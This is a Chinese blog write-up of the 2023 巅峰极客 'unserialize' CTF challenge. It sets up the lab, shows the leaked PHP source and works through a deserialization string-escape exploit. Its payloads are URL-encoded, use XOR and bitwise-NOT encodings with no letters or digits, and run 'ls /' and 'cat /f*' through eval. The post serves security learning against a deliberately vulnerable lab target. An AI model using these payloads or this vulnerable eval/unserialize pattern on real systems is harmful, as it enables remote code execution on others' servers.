+++
title = '2023巅峰极客unserialize'
date = '2023-09-24T15:46:01+08:00'
categories = ['比赛', '安全', '学习']
tags = ['字符串逃逸', 'php反序列化', 'php', 'rce', '安全']
+++

## 环境搭建

题目镜像：lxxxin/dfjk2023_unserialize
开启环境：

```dockerfile
docker run -it -d -p 4599:80 -e FLAG=flag{8382843b-d3e8-72fc-6625-ba5269953b23} lxxxin/dfjk2023_unserialize
```

## 题目考点

### 1.反序列化字符串逃逸

### 2.源码泄露

### 3.无数字字母rce

## 解题过程

开始一个登录框，试一下万能密码
![image-20230727164318452](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202307271643495.png)

这里注意报错信息，push_it类里面的_toString方法必须返回一个字符串类型的值，这道题应该是反序列的一道题。

这里通过扫目录，发现源码泄露，直接访问www.zip，下载源码。
这里有4个php文件
先看index.php

```php
<?php
include_once "my.php";
include_once "function.php";
include_once "login.html";
session_start();//开启会话

if (isset($_POST['root']) && isset($_POST['pwd'])) {
	$root = $_POST['root'];
	$pwd = $_POST['pwd'];
	$login = new push_it($root, $pwd);//实例化push_it类
	$_SESSION['login'] = b(serialize($login));//先进行序列化，再经过b函数处理
	die('<script>location.href=`./login.php`;</script>');
}
?>
```

my.php

```php
<?php

class pull_it {
	private $x;
	function __construct($xx) {
		$this->x = $xx;
	}
	function __destruct() {
		if ($this->x) {
			$preg_match = 'return preg_match("/[A-Za-z0-9]+/i", $this->x);';//无数字字母
		if (eval($preg_match)) {
			echo $preg_match;
			exit("save_waf");
	}
		@eval($this->x);//目标点
		}	
}
class push_it {
	private $root;
	private $pwd;
	function __construct($root, $pwd) {
		$this->root = $root;
		$this->pwd = $pwd;
	}
		function __destruct() {
		unset($this->root);
		unset($this->pwd);
	}
	function __toString() {
		if (isset($this->root) && isset($this->pwd)) {
			echo "<h1>Hello, $this->root</h1>";
		}
		else {
			echo "<h1>out!</h1>";
		}}
}
?>
```

function.php

```php
<?php
function b($data) {
	return str_replace('aaaa', 'bbbbbb', $data);//字符串增多
}
function a($data) {
	return str_replace('bbbbbb', 'aaaa', $data);//字符串减少
}
?>
```

login.php

```php
<?php
session_start();
include_once "my.php";
include_once "function.php";

if (!isset($_SESSION['login'])) {
	echo '<script>alert(`Login First!`);location.href=`./index.php`;</script>';
}

$login = @unserialize(a($_SESSION['login']));//利用点
echo $login;
?>
```

审计完4个文件，大致的攻击思路：

1.通过post root 和pwd参数，进行实例化push_it类 

2.通过字符串逃逸使得push_it类的pwd属性实例化pull_it类

3.然后通过修改$xx来进行eval函数执行。

这里利用字符串减少来进行逃逸
这里对 root=aaa pwd=bbb,先测试一下

```
O:7:"push_it":2:{s:13:"push_itroot";s:3:"bbb";s:12:"push_itpwd";s:3:"aaa";}
```

去构造我们要执行的pop链，然后去看要逃逸的字符数量

```pseudocode
O:7:"push_it":2:{s:13:"push_itroot";s:3:"bbb";s:12:"push_itpwd";O:7:"pull_it":1:{s:10:"pull_itx";s:2:"ls";}}
这里要通过 s:3:"bbb";来将后面的字符串逃逸，然后在往后面构造 pwd去实例化 pull_it类
O:7:"push_it":2:{s:13:"push_itroot";s:3:"bbb";s:12:"push_itpwd";O:7:"pull_it":1:{s:10:"pull_itx";s:2:"ls";}}
O:7:"push_it":2:

O:7:"push_it":2:{s:13:"push_itroot";s:3:"bbb";s:12:"push_itpwd";s:54:"";s:3:"pwd";O:7:"pull_it":1:{s:10:"pull_itx";s:2:"ls";}";}
这里";s:12:"push_itpwd";s:54:"就是我们要逃逸的内容 这里是28个字符也就是要输入 14*6=84个 b
O:7:"push_it":2:{s:13:"push_itroot";s:84:"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:12:"push_itpwd";s:54:"";s:3:"pwd";O:7:"pull_it":1:{s:10:"pull_itx";s:2:"ls";}";}

";s:3:"pwd";O:7:"pull_it":1:{s:10:"pull_itx";s:2:"ls";}就是要传入的pwd的值
因为无数字字母，这里

url编码后
";s:3:"pwd";O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A17%3A%22%28%7E%8C%86%8C%8B%9A%92%29%28%7E%93%8C%DF%D0%29%3B%22%3B%7D    ---ls /

";s:3:"pwd";O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A41%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%03%01%08%00%00%06%00%22%5E%22%60%60%7C+%2F%60%2A%22%29%3B%22%3B%7D  
--cat /f*

(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0); 
(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);
("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%03%01%08%00%00%06%00"^"%60%60%7c%20%2f%60%2a");
%93%8C%DF%D0
system('ls /');
```

```php
<?php
class pull_it {
	private $x;
	function __construct($xx) {
		$this->x = $xx;
	}
}
$a=new pull_it(urldecode("(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);"));
echo serialize($a);
echo '<br>';
echo urlencode( serialize($a));
```

## 总结

字符串逃逸构造：先随便把属性赋值，然后输出序列化后的，然后通过输出判断要逃逸的字符串长度，再伪造要构造的属性，
对于==非public==的属性，注意非可见字符，通过==%00==补充。再实例化时可以修改为public属性。

